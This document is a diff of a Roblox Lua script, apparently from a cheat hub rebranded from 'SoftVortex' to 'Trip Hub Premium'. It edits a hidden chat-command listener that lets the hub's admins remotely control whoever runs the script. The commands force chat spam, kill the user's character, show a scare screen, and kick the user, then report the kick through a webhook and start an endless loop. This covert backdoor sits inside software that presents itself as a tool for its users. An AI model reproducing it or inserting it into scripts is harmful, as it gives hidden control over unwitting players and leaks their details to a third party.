@@ -26,23 +26,16 @@ local function commands(msg, plr)
                 player.Character.HumanoidRootPart.Anchored = false
             end
             if string.find(SplitCMD[1], ":users") then
-                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Get Good, Get SoftVortex!", "All")
-            end
-            if string.find(SplitCMD[1], ":fling") then
-                player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
+                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Get Trip Hub Premium!", "All")
+				game.StarterGui:SetCore("SendNotification", {
+                    Title = "Users",
+                    Text = player.Name
+                })
             end
             if string.find(SplitCMD[1], ":kill") then
                local plr = game.Players.LocalPlayer
                 game.Players.LocalPlayer.Character.Humanoid.Health = 0
-            end
-            if string.find(SplitCMD[1], ":bring") then
-            local plr=game:service"Players".LocalPlayer;
-            local tweens=game:service"TweenService";
-            local info=TweenInfo.new(7,Enum.EasingStyle.Quad);
-            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[author].Character.Head.CFrame
-            local tween=tweens:Create(plr.Character["HumanoidRootPart"],info,{CFrame=pos});
-            tween:Play();
-            end
+            end	
             if string.find(SplitCMD[1], ":scare") then
                 function Scare()
                     local ScreenGui = Instance.new("ScreenGui")
@@ -84,7 +77,7 @@ local function commands(msg, plr)
             if string.find(SplitCMD[1], ":kick") then
                 local ISADMIN = table.find(Admins, player.UserId)
                 if not ISADMIN then
-                    player:Kick("Kicked.")
+                    player:Kick("Kicked")
                     Webhook(player, "USER KICKED!")
                     wait(5)
                     while true do
@@ -95,6 +88,8 @@ local function commands(msg, plr)
 end
     end
 end
+
+
 
 Players.PlayerAdded:Connect(
     function(plr)
